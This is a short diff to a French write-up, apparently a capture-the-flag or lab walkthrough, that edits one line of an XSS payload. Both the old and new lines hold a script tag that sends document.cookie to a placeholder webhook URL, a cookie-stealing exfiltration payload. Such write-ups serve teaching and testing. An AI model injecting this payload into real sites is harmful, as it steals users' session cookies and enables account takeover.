@@ -25,7 +25,7 @@ On va donc reproduire la commande, en JS pour le coup. On va utiliser une addres
 Notre script : 
 
 ```js
-<script>fetch("<adressewebhook>" + "?c=" + encodeURIComponent(document.cookie));</script>
+<script>fetch("<url_webhook>?c=" + encodeURIComponent(document.cookie));</script>
 ```
 
 Ce qu'il va se passer : 
